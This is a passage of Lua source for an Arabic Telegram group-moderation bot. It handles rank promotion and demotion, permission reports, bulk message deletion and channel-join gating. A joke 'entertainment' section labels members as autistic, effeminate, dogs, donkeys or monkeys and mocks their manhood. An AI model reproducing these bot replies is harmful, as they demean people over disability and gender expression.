Addictive = Redis:sismember(LaRiCa.."Admin:Group"..msg.chat_id,Message_Reply.sender.user_id)
Distinguished = Redis:sismember(LaRiCa.."Special:Group"..msg.chat_id,Message_Reply.sender.user_id)
BanGroup = Redis:sismember(LaRiCa.."BanGroup:Group"..msg.chat_id,Message_Reply.sender.user_id)
SilentGroup = Redis:sismember(LaRiCa.."SilentGroup:Group"..msg.chat_id,Message_Reply.sender.user_id)
if BanGroup then
BanGroupz = "✓"
else
BanGroupz = "✗"
end
if SilentGroup then
SilentGroupz = "✓"
else
SilentGroupz = "✗"
end
if TheBasics then
TheBasicsz = "✓"
else
TheBasicsz = "✗"
end
if Originators then
Originatorsz = "✓"
else
Originatorsz = "✗"
end
if Managers then
Managersz = "✓"
else
Managersz = "✗"
end
if Addictive then
Addictivez = "✓"
else
Addictivez = "✗"
end
if Distinguished then
Distinguishedz = "✓"
else
Distinguishedz = "✗"
end
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'رفع منشئ اساسي : '..TheBasicsz, data =msg.sender.user_id..'/statusTheBasicsz/'..Message_Reply.sender.user_id},{text = 'رفع منشئ : '..Originatorsz, data =msg.sender.user_id..'/statusOriginatorsz/'..Message_Reply.sender.user_id},
},
{
{text = 'رفع مدير : '..Managersz, data =msg.sender.user_id..'/statusManagersz/'..Message_Reply.sender.user_id},{text = 'رفع ادمن : '..Addictivez, data =msg.sender.user_id..'/statusAddictivez/'..Message_Reply.sender.user_id},
},
{
{text = 'رفع مميز : '..Distinguishedz, data =msg.sender.user_id..'/statusDistinguishedz/'..Message_Reply.sender.user_id},
},
{
{text = 'حظر العضو : '..BanGroupz, data =msg.sender.user_id..'/statusban/'..Message_Reply.sender.user_id},{text = 'كتم العضو : '..SilentGroupz, data =msg.sender.user_id..'/statusktm/'..Message_Reply.sender.user_id},
},
{
{text = 'تنزيل الرتب : ', data =msg.sender.user_id..'/statusmem/'..Message_Reply.sender.user_id},
},
{
{text = '٬ 𝗁𝗂𝖽𝖾 𝗂𝗍 ٫ ', data ='/delAmr1'}
}
}
}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• يمكنك تحكم بالعضو عن طريق الازرار \n تعني ان معه الرتبه : ✓ \nتعني انه ليس معه رتبه : ✗*',"md",false, false, false, false, reply_markup)
end
if text == 'معلوماتي' or text == 'موقعي' then
local UserInfo = LuaTele.getUser(msg.sender.user_id)
--var(LuaTele.getChatMember(msg_chat_id,msg.sender.user_id))
local StatusMember = LuaTele.getChatMember(msg_chat_id,msg.sender.user_id).status.luatele
if (StatusMember == "chatMemberStatusCreator") then
StatusMemberChat = 'مالك الكروب'
elseif (StatusMember == "chatMemberStatusAdministrator") then
StatusMemberChat = 'مشرف الكروب'
else
StatusMemberChat = 'عضو في الكروب'
end
local UserId = msg.sender.user_id
local RinkBot = msg.Name_Controller
local TotalMsg = Redis:get(LaRiCa..'Num:Message:User'..msg_chat_id..':'..msg.sender.user_id) or 0
local TotalEdit = Redis:get(LaRiCa..'Num:Message:Edit'..msg_chat_id..msg.sender.user_id) or 0
local TotalMsgT = Total_message(TotalMsg) 
if UserInfo.username then
UserInfousername = '@'..UserInfo.username..''
else
UserInfousername = 'لا يوجد'
end
if StatusMemberChat == 'مشرف الكروب' then 
local GetMemberStatus = LuaTele.getChatMember(msg_chat_id,msg.sender.user_id).status
if GetMemberStatus.can_change_info then
change_info = '❬ ✓ ❭' else change_info = '❬ ✗ ❭'
end
if GetMemberStatus.can_delete_messages then
delete_messages = '❬ ✓ ❭' else delete_messages = '❬ ✗ ❭'
end
if GetMemberStatus.can_invite_users then
invite_users = '❬ ✓ ❭' else invite_users = '❬ ✗ ❭'
end
if GetMemberStatus.can_pin_messages then
pin_messages = '❬ ✓ ❭' else pin_messages = '❬ ✗ ❭'
end
if GetMemberStatus.can_restrict_members then
restrict_members = '❬ ✓ ❭' else restrict_members = '❬ ✗ ❭'
end
if GetMemberStatus.can_promote_members then
promote = '❬ ✓ ❭' else promote = '❬ ✗ ❭'
end
PermissionsUser = '*\n• صلاحيات المستخدم :\nٴ— — — — — — — — — —'..'\n• تغيير المعلومات : '..change_info..'\n• تثبيت الرسائل : '..pin_messages..'\n• اضافه مستخدمين : '..invite_users..'\n• مسح الرسائل : '..delete_messages..'\n• حظر المستخدمين : '..restrict_members..'\n• اضافه المشرفين : '..promote..'\n\n*'
end
return LuaTele.sendText(msg_chat_id,msg_id,
'\n*- 𝖨𝖣 ▹ '..UserId..
'\n- 𝖴𝖲𝖤 ▹ '..UserInfousername..
'\n- 𝖲𝖳𝖠 ▹ '..RinkBot..
'\n- RANK ▹ '..StatusMemberChat..
'\n- 𝖬𝖲𝖦 ▹ '..TotalMsg..
'\n- 𝖡𝗂𝗈 ▹ '..getbio(UserId)..
'*'..(PermissionsUser or '') ,"md",true) 
end
if text == 'كشف البوت' then 
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local StatusMember = LuaTele.getChatMember(msg_chat_id,LaRiCa).status.luatele
if (StatusMember ~= "chatMemberStatusAdministrator") then
return LuaTele.sendText(msg_chat_id,msg_id,'• البوت عضو في الكروب ',"md",true) 
end
local GetMemberStatus = LuaTele.getChatMember(msg_chat_id,LaRiCa).status
if GetMemberStatus.can_change_info then
change_info = '❬ ✓ ❭' else change_info = '❬ ✗ ❭'
end
if GetMemberStatus.can_delete_messages then
delete_messages = '❬ ✓ ❭' else delete_messages = '❬ ✗ ❭'
end
if GetMemberStatus.can_invite_users then
invite_users = '❬ ✓ ❭' else invite_users = '❬ ✗ ❭'
end
if GetMemberStatus.can_pin_messages then
pin_messages = '❬ ✓ ❭' else pin_messages = '❬ ✗ ❭'
end
if GetMemberStatus.can_restrict_members then
restrict_members = '❬ ✓ ❭' else restrict_members = '❬ ✗ ❭'
end
if GetMemberStatus.can_promote_members then
promote = '❬ ✓ ❭' else promote = '❬ ✗ ❭'
end
PermissionsUser = '*\n• صلاحيات البوت في الكروب :\nٴ— — — — — — — — — —'..'\n• تغيير المعلومات : '..change_info..'\n• تثبيت الرسائل : '..pin_messages..'\n• اضافه مستخدمين : '..invite_users..'\n• مسح الرسائل : '..delete_messages..'\n• حظر المستخدمين : '..restrict_members..'\n• اضافه المشرفين : '..promote..'\n\n*'
return LuaTele.sendText(msg_chat_id,msg_id,PermissionsUser,"md",true) 
end

if text and text:match('^مسح (%d+)$') then
local NumMessage = text:match('^مسح (%d+)$')
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).Delmsg == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه حذف الرسائل* ',"md",true)  
end
if tonumber(NumMessage) > 1000 then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• العدد اكثر من 1000 لا تستطيع الحذف',"md",true)  
end
local Message = msg.id
for i=1,tonumber(NumMessage) do
local deleteMessages = LuaTele.deleteMessages(msg.chat_id,{[1]= Message})
var(deleteMessages)
Message = Message - 1048576
end
LuaTele.sendText(msg_chat_id, msg_id, "• تم مسح - "..NumMessage.. ' رساله', 'md')
end

if text and text:match('^تنزيل (.*) @(%S+)$') then
local UserName = {text:match('^تنزيل (.*) @(%S+)$')}
local UserId_Info = LuaTele.searchPublicChat(UserName[2])
if not UserId_Info.id then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName[2]:match('(%S+)[Bb][Oo][Tt]') then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if UserName[1] == "مطور ثانوي" then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(LaRiCa.."Devss:Groups",UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم تنزيله مطور ثانوي مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."Devss:Groups",UserId_Info.id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم تنزيله مطور ثانوي").Reply,"md",true)  
end
end
if UserName[1] == "مطور" then
if not msg.Devss then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(LaRiCa.."Dev:Groups",UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم تنزيله مطور مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."Dev:Groups",UserId_Info.id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم تنزيله مطور ").Reply,"md",true)  
end
end
if UserName[1] == "مالك" then
if not msg.Dev then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(3)..'* ',"md",true)  
end
if not Redis:sismember(LaRiCa.."Owners:Group"..msg_chat_id,UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم تنزيله مالك مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."Owners:Group"..msg_chat_id,UserId_Info.id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم تنزيله مالك ").Reply,"md",true)  
end
end
if UserName[1] == "منشئ اساسي" then
if not msg.Supcreatorm then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(LaRiCa.."Supcreator:Group"..msg_chat_id,UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم تنزيله منشئ اساسي مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."Supcreator:Group"..msg_chat_id,UserId_Info.id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم تنزيله منشئ اساسي ").Reply,"md",true)  
end
end
if UserName[1] == "منشئ" then
if not msg.Supcreator then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(4)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(LaRiCa.."Creator:Group"..msg_chat_id,UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم تنزيله من المنشئين مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."Creator:Group"..msg_chat_id,UserId_Info.id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم تنزيله من المنشئين ").Reply,"md",true)  
end
end
if UserName[1] == "مدير" then
if not msg.Creator then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(5)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(LaRiCa.."Manger:Group"..msg_chat_id,UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم تنزيله من المدراء مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."Manger:Group"..msg_chat_id,UserId_Info.id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم تنزيله من المدراء ").Reply,"md",true)  
end
end
if UserName[1] == "ادمن" then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(LaRiCa.."Admin:Group"..msg_chat_id,UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم تنزيله من الادمنيه مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."Admin:Group"..msg_chat_id,UserId_Info.id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم تنزيله من الادمنيه ").Reply,"md",true)  
end
end
if UserName[1] == "مميز" then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(LaRiCa.."Special:Group"..msg_chat_id,UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم تنزيله من المميزين مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."Special:Group"..msg_chat_id,UserId_Info.id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم تنزيله من المميزبن ").Reply,"md",true)  
end
end
end
if text and text:match("^تنزيل (.*)$") and msg.reply_to_message_id ~= 0 then
local TextMsg = text:match("^تنزيل (.*)$")
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if TextMsg == 'مطور ثانوي' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(LaRiCa.."Devss:Groups",Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله مطور ثانوي مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."Devss:Groups",Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله مطور ثانوي").Reply,"md",true)  
end
end
if TextMsg == 'مطور' then
if not msg.Devss then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(LaRiCa.."Dev:Groups",Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله مطور مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."Dev:Groups",Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله مطور ").Reply,"md",true)  
end
end
if TextMsg == "مالك" then
if not msg.Dev then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(3)..'* ',"md",true)  
end
if not Redis:sismember(LaRiCa.."Owners:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله مالك مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."Owners:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله مالك ").Reply,"md",true)  
end
end
if TextMsg == "منشئ اساسي" then
if not msg.Supcreatorm then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(LaRiCa.."Supcreator:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله منشئ اساسي مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."Supcreator:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله منشئ اساسي ").Reply,"md",true)  
end
end
if TextMsg == "منشئ" then
if not msg.Supcreator then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(4)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(LaRiCa.."Creator:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله من المنشئين مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."Creator:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله من المنشئين ").Reply,"md",true)  
end
end
if TextMsg == "مدير" then
if not msg.Creator then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(5)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(LaRiCa.."Manger:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله من المدراء مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."Manger:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله من المدراء ").Reply,"md",true)  
end
end
if TextMsg == "ادمن" then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(LaRiCa.."Admin:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله من الادمنيه مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."Admin:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله من الادمنيه ").Reply,"md",true)  
end
end
if TextMsg == "مميز" then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(LaRiCa.."Special:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله من المميزين مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."Special:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله من المميزبن ").Reply,"md",true)  
end
end
----تنزيل تسليه -----
if TextMsg == "فرخ" then
if not Redis:sismember(LaRiCa.."kholat:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله من الفرخات قبل كدة 🙃 ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."kholat:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله من الفرخات لازم ياخد دروس رجوله😂🌚 ").Reply,"md",true)  
end
end
if TextMsg == "وتكه" then
if not Redis:sismember(LaRiCa.."wtka:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله من الوتكات قبل كدة 🙃 ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."wtka:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيلها من الوتكات بعد معرفنا انها فلاتر😂🌚 ").Reply,"md",true)  
end
end
if TextMsg == "متوحد" then
if not Redis:sismember(LaRiCa.."twhd:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• اتعالج خلاص ?? ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."twhd:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله من المتوحدين بعد ما اتعالج😂🌚 ").Reply,"md",true)  
end
end
if TextMsg == "متوحده" then
if not Redis:sismember(LaRiCa.."twhd:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• اتعالج خلاص 🙃 ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."twhd:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله من المتوحدين بعد ما اتعالج😂?? ").Reply,"md",true)  
end
end
if TextMsg == "جلب" then
if not Redis:sismember(LaRiCa.."klb:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• الجلب دا بطل هوهوه ونزلناه  🙃 ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."klb:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله من الجلاب خليه يرجع العضمه😂🌚 ").Reply,"md",true)  
end
end
if TextMsg == "حمار" then
if not Redis:sismember(LaRiCa.."mar:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• الحمار دا عقل من زمان   🙃 ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."mar:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله من الحمير تعال نفك الكارو منك😂🌚 ").Reply,"md",true)  
end
end
if TextMsg == "نثيه" then
if not Redis:sismember(LaRiCa.."smb:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• بطل يمشي ورا الحريم 😂   🙃 ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."smb:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله من النثيه لازم ياخد دروس رجوله😂🌚 ").Reply,"md",true)  
end
end
if TextMsg == "قرد" then
if not Redis:sismember(LaRiCa.."2rd:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• بطل يطنط علي شجر ??   🙃 ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."2rd:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله من قايمه القرود تعال نزلو من الشجره😂🌚 ").Reply,"md",true)  
end
end
if TextMsg == "فرخي" then
if not Redis:sismember(LaRiCa.."3ra:Group"..msg_chat_id,Message_Reply.sender.user_id) then
